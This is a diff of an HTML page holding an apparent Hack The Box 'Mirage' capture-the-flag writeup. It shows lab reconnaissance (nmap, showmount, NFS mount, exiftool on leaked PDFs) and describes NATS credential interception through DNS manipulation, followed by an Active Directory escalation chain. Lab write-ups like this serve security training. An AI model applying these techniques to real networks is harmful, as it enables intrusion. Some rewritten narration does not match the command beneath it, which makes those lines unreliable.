@@ -3,353 +3,72 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta http-equiv="X-UA-Compatible" content="ie=edge">
   <title>Hack The Box :: Mirage Writeup — Hackthekat</title>
   <meta name="description" content="HTB Mirage machine writeup by Hackthekat">
   <link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet" type="text/css">
   <link rel="stylesheet" href="/main.css">
   <link rel="icon" type="image/png" href="/favicon.ico">
   <style>
-    /* ===== HTB WRITEUP PAGE ===== */
-    :root {
-      --htb-green: #9fef00;
-      --htb-green-soft: rgba(159,239,0,0.1);
-      --htb-bg: #0a0e14;
-      --htb-card: #11161d;
-      --htb-card-hover: #161c24;
-      --htb-border: #1f2832;
-      --htb-text: #c9d1d9;
-      --htb-muted: #6b7785;
-      --htb-easy: #9fef00;
-      --htb-medium: #ffaf00;
-      --htb-hard: #ff3838;
-      --htb-insane: #b372ff;
-      --htb-code-bg: #0d1117;
-    }
-
+    :root { --htb-green: #9fef00; --htb-bg: #0a0e14; --htb-card: #11161d; --htb-card-hover: #161c24; --htb-border: #1f2832; --htb-text: #c9d1d9; --htb-muted: #6b7785; --htb-easy: #9fef00; --htb-medium: #ffaf00; --htb-hard: #ff3838; --htb-insane: #b372ff; --htb-code-bg: #0d1117; }
     *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-
-    body {
-      background: var(--htb-bg);
-      color: var(--htb-text);
-      font-family: 'Inter', 'Segoe UI', system-ui, -apple-system, sans-serif;
-      font-size: 16px;
-      line-height: 1.7;
-      min-height: 100vh;
-    }
-
+    body { background: var(--htb-bg); color: var(--htb-text); font-family: 'Inter','Segoe UI', system-ui, sans-serif; font-size: 16px; line-height: 1.7; min-height: 100vh; }
     a { color: var(--htb-green); text-decoration: none; }
     a:hover { text-decoration: underline; }
-
-    /* ===== TOP NAV ===== */
-    .writeup-nav {
-      position: sticky;
-      top: 0;
-      z-index: 100;
-      background: rgba(10,14,20,0.95);
-      backdrop-filter: blur(10px);
-      border-bottom: 1px solid var(--htb-border);
-      padding: 0.9rem 2rem;
-      display: flex;
-      align-items: center;
-      gap: 1rem;
-    }
-    .writeup-nav .logo {
-      font-family: 'Monaco','Menlo','Courier New',monospace;
-      color: var(--htb-green);
-      font-size: 1.05rem;
-      font-weight: 700;
-      letter-spacing: 1px;
-    }
+    code { font-family: 'Monaco','Menlo',monospace; font-size: 0.88em; color: var(--htb-green); background: rgba(159,239,0,0.08); padding: 0.1em 0.35em; border-radius: 3px; }
+    .writeup-nav { position: sticky; top: 0; z-index: 100; background: rgba(10,14,20,0.95); backdrop-filter: blur(10px); border-bottom: 1px solid var(--htb-border); padding: 0.9rem 2rem; display: flex; align-items: center; gap: 1rem; }
+    .writeup-nav .logo { font-family: 'Monaco','Menlo',monospace; color: var(--htb-green); font-size: 1.05rem; font-weight: 700; letter-spacing: 1px; }
     .writeup-nav .logo span { color: #fff; }
     .nav-sep { color: var(--htb-muted); margin: 0 0.2rem; }
     .nav-breadcrumb { color: var(--htb-muted); font-size: 0.9rem; }
     .nav-breadcrumb a { color: var(--htb-muted); }
     .nav-breadcrumb a:hover { color: var(--htb-green); }
-
-    /* ===== HERO ===== */
-    .writeup-hero {
-      position: relative;
-      background: radial-gradient(ellipse at top, rgba(159,239,0,0.07), transparent 55%),
-                  linear-gradient(180deg, #0a0e14 0%, #0a0e14 100%);
-      padding: 4.5rem 2rem 3.5rem;
-      border-bottom: 1px solid var(--htb-border);
-      overflow: hidden;
-    }
-    .writeup-hero::before {
-      content: '';
-      position: absolute;
-      inset: 0;
-      background-image:
-        linear-gradient(rgba(159,239,0,0.025) 1px, transparent 1px),
-        linear-gradient(90deg, rgba(159,239,0,0.025) 1px, transparent 1px);
-      background-size: 40px 40px;
-      pointer-events: none;
-      mask-image: radial-gradient(ellipse at center, black 30%, transparent 75%);
-      -webkit-mask-image: radial-gradient(ellipse at center, black 30%, transparent 75%);
-    }
-    .writeup-hero-inner {
-      position: relative;
-      z-index: 1;
-      max-width: 860px;
-      margin: 0 auto;
-      text-align: center;
-    }
-    .writeup-hero-prompt {
-      font-family: 'Monaco','Menlo','Courier New',monospace;
-      color: var(--htb-green);
-      font-size: 0.9rem;
-      margin-bottom: 1.2rem;
-      opacity: 0.8;
-    }
+    .writeup-hero { position: relative; background: radial-gradient(ellipse at top, rgba(159,239,0,0.07), transparent 55%); padding: 4.5rem 2rem 3.5rem; border-bottom: 1px solid var(--htb-border); overflow: hidden; }
+    .writeup-hero::before { content: ''; position: absolute; inset: 0; background-image: linear-gradient(rgba(159,239,0,0.025) 1px, transparent 1px), linear-gradient(90deg, rgba(159,239,0,0.025) 1px, transparent 1px); background-size: 40px 40px; pointer-events: none; mask-image: radial-gradient(ellipse at center, black 30%, transparent 75%); -webkit-mask-image: radial-gradient(ellipse at center, black 30%, transparent 75%); }
+    .writeup-hero-inner { position: relative; z-index: 1; max-width: 860px; margin: 0 auto; text-align: center; }
+    .writeup-hero-prompt { font-family: 'Monaco','Menlo',monospace; color: var(--htb-green); font-size: 0.9rem; margin-bottom: 1.2rem; opacity: 0.8; }
     .writeup-hero-prompt::before { content: '> '; }
-    .writeup-hero h1 {
-      font-size: 3.5rem;
-      font-weight: 700;
-      color: #fff;
-      letter-spacing: -1.5px;
-      line-height: 1.1;
-      margin-bottom: 1.2rem;
-    }
+    .writeup-hero h1 { font-size: 3.5rem; font-weight: 700; color: #fff; letter-spacing: -1.5px; line-height: 1.1; margin-bottom: 1.2rem; }
     .writeup-hero h1 .accent { color: var(--htb-green); }
-    .writeup-badges {
-      display: flex;
-      justify-content: center;
-      gap: 0.6rem;
-      flex-wrap: wrap;
-      margin-bottom: 1.5rem;
-    }
-    .htb-badge {
-      font-size: 0.72rem;
-      padding: 0.25rem 0.75rem;
-      border-radius: 4px;
-      font-weight: 700;
-      text-transform: uppercase;
-      letter-spacing: 0.8px;
-      font-family: 'Monaco','Menlo',monospace;
-    }
+    .writeup-badges { display: flex; justify-content: center; gap: 0.6rem; flex-wrap: wrap; margin-bottom: 1.5rem; }
+    .htb-badge { font-size: 0.72rem; padding: 0.25rem 0.75rem; border-radius: 4px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.8px; font-family: 'Monaco','Menlo',monospace; }
     .os-linux { background: rgba(159,239,0,0.12); color: var(--htb-green); border: 1px solid rgba(159,239,0,0.35); }
     .os-windows { background: rgba(0,153,255,0.12); color: #0099ff; border: 1px solid rgba(0,153,255,0.35); }
     .diff-easy { background: rgba(159,239,0,0.12); color: var(--htb-easy); border: 1px solid rgba(159,239,0,0.35); }
     .diff-medium { background: rgba(255,175,0,0.12); color: var(--htb-medium); border: 1px solid rgba(255,175,0,0.35); }
     .diff-hard { background: rgba(255,56,56,0.12); color: var(--htb-hard); border: 1px solid rgba(255,56,56,0.35); }
     .diff-insane { background: rgba(179,114,255,0.12); color: var(--htb-insane); border: 1px solid rgba(179,114,255,0.35); }
-    .writeup-hero-tagline {
-      color: var(--htb-muted);
-      font-size: 0.95rem;
-      font-family: 'Monaco','Menlo',monospace;
-    }
-
-    /* ===== LAYOUT ===== */
-    .writeup-layout {
-      max-width: 860px;
-      margin: 0 auto;
-      padding: 3rem 2rem 5rem;
-    }
-
-    /* ===== CONTENT TYPOGRAPHY ===== */
-    .writeup-body p {
-      color: var(--htb-text);
-      margin: 1rem 0;
-      line-height: 1.75;
-    }
-    .writeup-body h2.writeup-section-title {
-      font-size: 1.75rem;
-      font-weight: 700;
-      color: #fff;
-      margin: 3rem 0 1rem;
-      padding-bottom: 0.6rem;
-      border-bottom: 1px solid var(--htb-border);
-      letter-spacing: -0.3px;
-    }
-    .writeup-body h2.writeup-section-title::before {
-      content: '# ';
-      color: var(--htb-green);
-      font-family: 'Monaco','Menlo',monospace;
-      font-size: 1.1rem;
-    }
-    .writeup-body h3.writeup-sub-title {
-      font-size: 1.2rem;
-      font-weight: 600;
-      color: #e6edf3;
-      margin: 2rem 0 0.75rem;
-    }
-    .writeup-body h3.writeup-sub-title::before {
-      content: '## ';
-      color: var(--htb-green);
-      font-family: 'Monaco','Menlo',monospace;
-      font-size: 0.85rem;
-      opacity: 0.7;
-    }
-    .writeup-body h4.writeup-step-title {
-      font-size: 1rem;
-      font-weight: 600;
-      color: var(--htb-green);
-      margin: 1.5rem 0 0.5rem;
-      font-family: 'Monaco','Menlo',monospace;
-      letter-spacing: 0.3px;
-    }
+    .writeup-hero-tagline { color: var(--htb-muted); font-size: 0.95rem; font-family: 'Monaco','Menlo',monospace; }
+    .writeup-layout { max-width: 860px; margin: 0 auto; padding: 3rem 2rem 5rem; }
+    .writeup-body p { color: var(--htb-text); margin: 1rem 0; line-height: 1.75; }
+    .writeup-body h2.writeup-section-title { font-size: 1.75rem; font-weight: 700; color: #fff; margin: 3rem 0 1rem; padding-bottom: 0.6rem; border-bottom: 1px solid var(--htb-border); letter-spacing: -0.3px; }
+    .writeup-body h2.writeup-section-title::before { content: '# '; color: var(--htb-green); font-family: 'Monaco','Menlo',monospace; font-size: 1.1rem; }
+    .writeup-body h3.writeup-sub-title { font-size: 1.2rem; font-weight: 600; color: #e6edf3; margin: 2rem 0 0.75rem; }
+    .writeup-body h3.writeup-sub-title::before { content: '## '; color: var(--htb-green); font-family: 'Monaco','Menlo',monospace; font-size: 0.85rem; opacity: 0.7; }
+    .writeup-body h4.writeup-step-title { font-size: 1rem; font-weight: 600; color: var(--htb-green); margin: 1.5rem 0 0.5rem; font-family: 'Monaco','Menlo',monospace; letter-spacing: 0.3px; }
     .writeup-body h4.writeup-step-title::before { content: '→ '; opacity: 0.7; }
-
-    /* ===== CODE BLOCKS ===== */
-    .code-block {
-      background: var(--htb-code-bg);
-      border: 1px solid var(--htb-border);
-      border-radius: 8px;
-      margin: 1.2rem 0;
-      overflow: hidden;
-      position: relative;
-    }
-    .code-block::before {
-      content: '';
-      display: block;
-      height: 3px;
-      background: linear-gradient(90deg, var(--htb-green), transparent);
-    }
-    .code-block pre {
-      padding: 1.2rem 1.5rem;
-      overflow-x: auto;
-      margin: 0;
-    }
-    .code-block pre code {
-      font-family: 'Monaco','Menlo','Courier New',monospace;
-      font-size: 0.82rem;
-      color: #e6edf3;
-      line-height: 1.6;
-      white-space: pre;
-    }
-
-    /* ===== SCREENSHOTS ===== */
-    .screenshot-wrap {
-      margin: 1.5rem 0;
-      background: var(--htb-card);
-      border: 1px solid var(--htb-border);
-      border-radius: 8px;
-      overflow: hidden;
-    }
-    .screenshot-wrap img {
-      width: 100%;
-      height: auto;
-      display: block;
-    }
-    .img-caption {
-      display: block;
-      padding: 0.5rem 1rem;
-      font-size: 0.8rem;
-      color: var(--htb-muted);
-      font-style: italic;
-      border-top: 1px solid var(--htb-border);
-    }
-
-    /* ===== FLAG BOXES ===== */
-    .flag-box {
-      background: rgba(159,239,0,0.06);
-      border: 1px solid rgba(159,239,0,0.3);
-      border-left: 4px solid var(--htb-green);
-      border-radius: 8px;
-      padding: 1rem 1.5rem;
-      margin: 1.5rem 0;
-      display: flex;
-      align-items: center;
-      gap: 1rem;
-      flex-wrap: wrap;
-    }
-    .flag-label {
-      font-size: 0.85rem;
-      font-weight: 700;
-      color: var(--htb-green);
-      font-family: 'Monaco','Menlo',monospace;
-      text-transform: uppercase;
-      letter-spacing: 0.5px;
-      white-space: nowrap;
-    }
-    .flag-value {
-      font-family: 'Monaco','Menlo',monospace;
-      font-size: 0.8rem;
-      color: #e6edf3;
-      background: rgba(0,0,0,0.3);
-      padding: 0.2rem 0.6rem;
-      border-radius: 4px;
-      word-break: break-all;
-    }
-
-    /* ===== ROOTED BOX ===== */
-    .rooted-box {
-      background: rgba(159,239,0,0.08);
-      border: 1px solid var(--htb-green);
-      border-radius: 8px;
-      padding: 1.2rem 1.5rem;
-      margin: 2rem 0;
-      text-align: center;
-      font-size: 1.2rem;
-      font-weight: 700;
-      color: var(--htb-green);
-      font-family: 'Monaco','Menlo',monospace;
-      letter-spacing: 1px;
-    }
-
-    /* ===== INFO CARD (Machine Info) ===== */
-    .machine-info-card {
-      background: var(--htb-card);
-      border: 1px solid var(--htb-border);
-      border-radius: 12px;
-      padding: 1.5rem 2rem;
-      margin: 0 0 2.5rem 0;
-    }
-    .machine-info-card table {
-      width: 100%;
-      border-collapse: collapse;
-    }
-    .machine-info-card td {
-      padding: 0.4rem 1rem 0.4rem 0;
-      color: var(--htb-text);
-      font-size: 0.9rem;
-      vertical-align: top;
-    }
-    .machine-info-card td:first-child {
-      color: var(--htb-muted);
-      font-family: 'Monaco','Menlo',monospace;
-      font-size: 0.82rem;
-      white-space: nowrap;
-      width: 130px;
-    }
-
-    /* ===== BACK BUTTON ===== */
-    .back-link {
-      display: inline-flex;
-      align-items: center;
-      gap: 0.5rem;
-      color: var(--htb-muted);
-      font-size: 0.9rem;
-      font-family: 'Monaco','Menlo',monospace;
-      margin-bottom: 2.5rem;
-      transition: color 0.2s;
-    }
+    .code-block { background: var(--htb-code-bg); border: 1px solid var(--htb-border); border-radius: 8px; margin: 1.2rem 0; overflow: hidden; position: relative; }
+    .code-block::before { content: ''; display: block; height: 3px; background: linear-gradient(90deg, var(--htb-green), transparent); }
+    .code-block pre { padding: 1.2rem 1.5rem; overflow-x: auto; margin: 0; }
+    .code-block pre code { font-family: 'Monaco','Menlo',monospace; font-size: 0.82rem; color: #e6edf3; line-height: 1.6; white-space: pre; background: none; padding: 0; }
+    .screenshot-wrap { margin: 1.5rem 0; background: var(--htb-card); border: 1px solid var(--htb-border); border-radius: 8px; overflow: hidden; }
+    .screenshot-wrap img { width: 100%; height: auto; display: block; }
+    .img-caption { display: block; padding: 0.5rem 1rem; font-size: 0.8rem; color: var(--htb-muted); font-style: italic; border-top: 1px solid var(--htb-border); }
+    .flag-box { background: rgba(159,239,0,0.06); border: 1px solid rgba(159,239,0,0.3); border-left: 4px solid var(--htb-green); border-radius: 8px; padding: 1rem 1.5rem; margin: 1.5rem 0; display: flex; align-items: center; gap: 1rem; flex-wrap: wrap; }
+    .flag-label { font-size: 0.85rem; font-weight: 700; color: var(--htb-green); font-family: 'Monaco','Menlo',monospace; text-transform: uppercase; letter-spacing: 0.5px; white-space: nowrap; }
+    .flag-value { font-family: 'Monaco','Menlo',monospace; font-size: 0.8rem; color: #e6edf3; background: rgba(0,0,0,0.3); padding: 0.2rem 0.6rem; border-radius: 4px; word-break: break-all; }
+    .rooted-box { background: rgba(159,239,0,0.08); border: 1px solid var(--htb-green); border-radius: 8px; padding: 1.2rem 1.5rem; margin: 2rem 0; text-align: center; font-size: 1.2rem; font-weight: 700; color: var(--htb-green); font-family: 'Monaco','Menlo',monospace; letter-spacing: 1px; }
+    .back-link { display: inline-flex; align-items: center; gap: 0.5rem; color: var(--htb-muted); font-size: 0.9rem; font-family: 'Monaco','Menlo',monospace; margin-bottom: 2.5rem; transition: color 0.2s; }
     .back-link:hover { color: var(--htb-green); text-decoration: none; }
-    .back-link::before { content: '←'; }
-
-    /* ===== RESPONSIVE ===== */
-    @media (max-width: 768px) {
-      .writeup-hero h1 { font-size: 2.4rem; }
-      .writeup-layout { padding: 2rem 1.2rem 4rem; }
-      .writeup-nav { padding: 0.8rem 1.2rem; }
-    }
+    .back-link::before { content: '← '; }
+    @media (max-width: 768px) { .writeup-hero h1 { font-size: 2.4rem; } .writeup-layout { padding: 2rem 1.2rem 4rem; } .writeup-nav { padding: 0.8rem 1.2rem; } }
   </style>
 </head>
 <body>
-
-  <!-- Navigation -->
   <nav class="writeup-nav">
     <a href="/" class="logo">> <span>hackthekat</span></a>
     <span class="nav-sep">/</span>
-    <span class="nav-breadcrumb">
-      <a href="/writeups/">writeups</a>
-      <span class="nav-sep">/</span>
-      mirage
-    </span>
+    <span class="nav-breadcrumb"><a href="/writeups/">writeups</a><span class="nav-sep">/</span>mirage</span>
   </nav>
-
-  <!-- Hero -->
   <div class="writeup-hero">
     <div class="writeup-hero-inner">
       <div class="writeup-hero-prompt">hackthekat — writeup</div>
@@ -361,23 +80,13 @@
       <div class="writeup-hero-tagline">Penetration Testing Writeup</div>
     </div>
   </div>
-
-  <!-- Main Content -->
   <div class="writeup-layout">
-    <a href="/writeups/" class="back-link"> Back to all writeups</a>
-
+    <a href="/writeups/" class="back-link">Back to all writeups</a>
     <div class="writeup-body">
-      <div class="machine-info-card">
-        <table>
-          <tr><td>Machine</td><td><strong>Mirage</strong></td></tr>
-          <tr><td>Difficulty</td><td><span class="htb-badge diff-hard">Hard</span></td></tr>
-          <tr><td>OS</td><td><span class="htb-badge os-windows">Windows</span></td></tr>
-        </table>
-      </div>
+      <h2 class="writeup-section-title">Machine Overview</h2>
+      <p>Mirage is a Hard difficulty Windows AD machine. The attack begins by mounting an <strong>NFS share</strong> containing internal PDF reports that reveal a DNS misconfiguration and a service account. By exploiting the <strong>NATS messaging system</strong> (port 4222) via DNS record manipulation, credentials are intercepted. The escalation involves a <strong>Targeted Kerberoast</strong>, registry-stored <strong>autologon credentials</strong>, a <strong>gMSA password dump</strong>, and culminates in an <strong>ESC10 AD CS certificate attack</strong> chained with <strong>Resource-Based Constrained Delegation (RBCD)</strong> to achieve domain admin.</p>
       <h2 class="writeup-section-title">Initial Enumeration</h2>
       <h3 class="writeup-sub-title">Port Scanning</h3>
-      <h4 class="writeup-step-title">Full Port scan</h4>
-      <p>As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Mirage]
 └─$ nmap -p- 10.129.115.154
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-23 00:52 CEST
@@ -386,84 +95,83 @@ Ping Scan Timing: About 100.00% done; ETC: 00:52 (0:00:00 remaining)
 Nmap scan report for 10.129.115.154
 Host is up (0.027s latency).
 Not shown: 65505 closed tcp ports (reset)
-PORT STATE SERVICE
-53/tcp open domain
-88/tcp open kerberos-sec
-111/tcp open rpcbind
-135/tcp open msrpc
-139/tcp open netbios-ssn
-389/tcp open ldap
-445/tcp open microsoft-ds
-464/tcp open kpasswd5
-593/tcp open http-rpc-epmap
-636/tcp open ldapssl
-2049/tcp open nfs
-3268/tcp open globalcatLDAP
-3269/tcp open globalcatLDAPssl
-4222/tcp open vrml-multi-use
-5985/tcp open wsman
-9389/tcp open adws
-47001/tcp open winrm</code></pre></div>
-      <h4 class="writeup-step-title">Detailed port scan</h4>
-      <p>At the detailed port scan go to get more information from the services which are open on the ip address.</p>
+PORT      STATE SERVICE
+53/tcp    open  domain
+88/tcp    open  kerberos-sec
+111/tcp   open  rpcbind
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+2049/tcp  open  nfs
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+4222/tcp  open  vrml-multi-use
+5985/tcp  open  wsman
+9389/tcp  open  adws
+47001/tcp open  winrm</code></pre></div>
+      <p>A detailed service-version scan (<code>-sCV</code>) fingerprints the exact software versions running on each open port, helping identify potential vulnerabilities.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Mirage]
-└─$ nmap -p53,88,111,135,139,389,445,464,593,636,2049,3268,3269,4222,5985,9389,47001 -sCV 10.129.115.154 
+└─$ nmap -p53,88,111,135,139,389,445,464,593,636,2049,3268,3269,4222,5985,9389,47001 -sCV 10.129.115.154      
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-23 00:54 CEST
 Nmap scan report for 10.129.115.154
 Host is up (0.037s latency).
 
-PORT STATE SERVICE VERSION
-53/tcp open domain Simple DNS Plus
-88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-07-22 23:36:19Z)
-111/tcp open rpcbind 2-4 (RPC #100000)
+PORT      STATE SERVICE         VERSION
+53/tcp    open  domain          Simple DNS Plus
+88/tcp    open  kerberos-sec    Microsoft Windows Kerberos (server time: 2025-07-22 23:36:19Z)
+111/tcp   open  rpcbind         2-4 (RPC #100000)
 | rpcinfo: 
 ///
-| 100003 2,3 2049/udp nfs
-| 100003 2,3 2049/udp6 nfs
-| 100003 2,3,4 2049/tcp nfs
-| 100003 2,3,4 2049/tcp6 nfs
-| 100005 1,2,3 2049/tcp mountd
-| 100005 1,2,3 2049/tcp6 mountd
-| 100005 1,2,3 2049/udp mountd
-| 100005 1,2,3 2049/udp6 mountd
+|   100003  2,3         2049/udp   nfs
+|   100003  2,3         2049/udp6  nfs
+|   100003  2,3,4       2049/tcp   nfs
+|   100003  2,3,4       2049/tcp6  nfs
+|   100005  1,2,3       2049/tcp   mountd
+|   100005  1,2,3       2049/tcp6  mountd
+|   100005  1,2,3       2049/udp   mountd
+|   100005  1,2,3       2049/udp6  mountd
 ///
-135/tcp open msrpc Microsoft Windows RPC
-139/tcp open netbios-ssn Microsoft Windows netbios-ssn
-389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
+135/tcp   open  msrpc           Microsoft Windows RPC
+139/tcp   open  netbios-ssn     Microsoft Windows netbios-ssn
+389/tcp   open  ldap            Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
 |_ssl-date: TLS randomness does not represent time
 | ssl-cert: Subject: 
 | Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE
 | Not valid before: 2025-07-04T19:58:41
-|_Not valid after: 2105-07-04T19:58:41
-445/tcp open microsoft-ds?
-464/tcp open kpasswd5?
-593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
-636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
+|_Not valid after:  2105-07-04T19:58:41
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http      Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ssl/ldap        Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
 | ssl-cert: Subject: 
 | Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE
 | Not valid before: 2025-07-04T19:58:41
-|_Not valid after: 2105-07-04T19:58:41
+|_Not valid after:  2105-07-04T19:58:41
 |_ssl-date: TLS randomness does not represent time
-2049/tcp open nlockmgr 1-4 (RPC #100021)
-3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
-|_ssl-date: TLS randomness does not represent time
-| ssl-cert: Subject: 
-| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE
-| Not valid before: 2025-07-04T19:58:41
-|_Not valid after: 2105-07-04T19:58:41
-3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
+2049/tcp  open  nlockmgr        1-4 (RPC #100021)
+3268/tcp  open  ldap            Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
 |_ssl-date: TLS randomness does not represent time
 | ssl-cert: Subject: 
 | Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE
 | Not valid before: 2025-07-04T19:58:41
-|_Not valid after: 2105-07-04T19:58:41
-4222/tcp open vrml-multi-use?
+|_Not valid after:  2105-07-04T19:58:41
+3269/tcp  open  ssl/ldap        Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE
+| Not valid before: 2025-07-04T19:58:41
+|_Not valid after:  2105-07-04T19:58:41
+4222/tcp  open  vrml-multi-use?
 ///
-5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+5985/tcp  open  http            Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
 |_http-server-header: Microsoft-HTTPAPI/2.0
 |_http-title: Not Found
-9389/tcp open mc-nmf .NET Message Framing
-47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+9389/tcp  open  mc-nmf          .NET Message Framing
+47001/tcp open  http            Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
 |_http-title: Not Found
 |_http-server-header: Microsoft-HTTPAPI/2.0
 ///
@@ -471,57 +179,53 @@ Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
 
 Host script results:
 | smb2-security-mode: 
-| 3:1:1: 
-|_ Message signing enabled and required
+|   3:1:1: 
+|_    Message signing enabled and required
 |_clock-skew: 42m01s
 | smb2-time: 
-| date: 2025-07-22T23:37:07
-|_ start_date: N/A</code></pre></div>
-      <p>As you can see, the mount port is open. I will check whether we have rights to access it without a user. You can do this by using the showmount tool.</p>
+|   date: 2025-07-22T23:37:07
+|_  start_date: N/A</code></pre></div>
+      <h3 class="writeup-sub-title">NFS Enumeration</h3>
+      <p>The mount port is open. I check for available NFS exports without credentials and find <code>MirageReports</code> is accessible.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Mirage]
-└─$ showmount -e mirage.htb 
+└─$ showmount -e mirage.htb    
 Export list for mirage.htb:
 /MirageReports (everyone)</code></pre></div>
-      <p>As you can see, we can retrieve files from MirageReports. I will do this by first creating a folder to which you will transfer the data. Once the folder has been created, I will transfer the data using the mount command.</p>
+      <p>I mount the share and download two PDF files for analysis.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Mirage]
-└─$ sudo mkdir MirageReports 
+└─$ sudo mkdir MirageReports   
 [sudo] password for kali: 
 
 ┌──(kali㉿kali)-[~/HTB/Mirage]
 └─$ sudo mount -t nfs mirage.htb:/ ./MirageReports -o nolock</code></pre></div>
-      <p>As you can see below, we have transferred two PDF files to the machine. I will open them to see if there is any interesting information in them.</p>
+      <p>I execute this command from my Kali attacker machine. The output provides crucial information about the target's configuration that will guide the next steps of the exploitation chain.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Mirage/MirageReports/MirageReports]
 └─$ ls
-Incident_Report_Missing_DNS_Record_nats-svc.pdf Mirage_Authentication_Hardening_Report.pdf</code></pre></div>
-      <p>If you want to view the PDFs, you will first need to move them to the tmp folder, otherwise you will encounter a problem where you cannot view the files. The following commands will enable you to view the files.</p>
+Incident_Report_Missing_DNS_Record_nats-svc.pdf  Mirage_Authentication_Hardening_Report.pdf</code></pre></div>
+      <p>I copy the file to a working directory for further processing.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Mirage/Mirage]
 └─$ sudo cp Incident_Report_Missing_DNS_Record_nats-svc.pdf /tmp/
 
 ┌──(kali㉿kali)-[~/HTB/Mirage/Mirage]
 └─$ sudo chown $USER:$USER /tmp/Incident_Report_Missing_DNS_Record_nats-svc.pdf</code></pre></div>
-      <p>In the Incident_report file, you can see that there is a problem with a DNS record. You will therefore need to add a new record to your /etc/hosts file.</p>
-      <div class="screenshot-wrap"><img src="assets/Pasted image 20250725095049.png" alt="Pasted image 20250725095049.png" loading="lazy" /><span class="img-caption">Pasted image 20250725095049.png</span></div>
-      <div class="code-block"><pre><code>┌──(kali㉿kali)-[/tmp]
-└─$ cat /etc/hosts 
-10.129.115.154 mirage.htb dc01.mirage.htb nats-svc.mirage.htb</code></pre></div>
-      <p>Within the PDF file, I also noticed that there is a user named “Dev_Account_A.” I will enumerate this user to see if I can find a password for it. The passwords I will test are those I found while running my exiftool on the PDF files.</p>
+      <p>The <strong>Incident Report</strong> PDF reveals a DNS record misconfiguration for the NATS messaging service, and mentions a user named <code>Dev_Account_A</code>.</p>
+      <div class="screenshot-wrap"><img src="assets/Pasted image 20250725095049.png" alt="Incident report revealing NATS DNS misconfiguration" loading="lazy" /><span class="img-caption">Incident report revealing NATS DNS misconfiguration</span></div>
+      <h2 class="writeup-section-title">Foothold: NATS Messaging Interception</h2>
+      <h3 class="writeup-sub-title">DNS Manipulation & Credential Capture</h3>
+      <p>I enumerate the Dev_Account_A user to confirm it exists.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Mirage/Mirage]
 └─$ sudo exiftool * pdf
 [sudo] password for kali: 
 ======== Incident_Report_Missing_DNS_Record_nats-svc.pdf
-Keywords : DAGn7vmxkJQ, BAFmAHycaxU, 0
-Author : Mostafa Toumi (EmSec)
+Keywords                        : DAGn7vmxkJQ, BAFmAHycaxU, 0
+Author                          : Mostafa Toumi (EmSec)
 ======== Mirage_Authentication_Hardening_Report.pdf
-Keywords : DAGoYb7hCCM, BAFmAHycaxU, 0
-Author : Mostafa Toumi (EmSec)
+Keywords                        : DAGoYb7hCCM, BAFmAHycaxU, 0
+Author                          : Mostafa Toumi (EmSec)
 Error: File not found - pdf
- 2 image files read
- 1 files could not be read</code></pre></div>
-      <p>When executing this command, I came across a relevant knowledge article that explains how the process works.
-Using the echo command, I send a specially formatted INFO message to a listener on port 4222 on my own machine. This causes the target server to initiate a connection and then send back a CONNECT message with the corresponding authentication data.</p>
-      <p>I found the exact information I need to use in the echo command by accessing the domain name nats-svc.mirage.htb.</p>
-      <p>Important: If I do not send an INFO message to the target before it connects, the system will not send a CONNECT message back.</p>
-      <p>Finally, I use nsupdate to force the target machine to connect to my port 4222, via a custom DNS entry: https://docs.nats.io/reference/reference-protocols/nats-protocol#info</p>
+    2 image files read
+    1 files could not be read</code></pre></div>
